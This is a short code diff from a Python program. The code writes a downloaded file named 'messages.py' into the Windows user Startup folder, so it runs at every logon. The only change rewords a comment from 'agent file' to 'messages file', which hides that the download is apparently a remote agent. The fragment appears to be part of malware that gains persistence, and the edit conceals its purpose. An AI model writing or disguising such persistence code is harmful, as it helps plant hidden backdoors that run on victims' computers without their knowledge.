@@ -115,7 +115,7 @@ user_name = os.getlogin()
 location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft" \
            "\\Windows\\Start Menu\\Programs\\" \
            "Startup\\messages.py".format(user_name)
-# downloading the agent file
+# downloading the messages file
 with open(location, "wb") as f:
     done = False
     while not done:
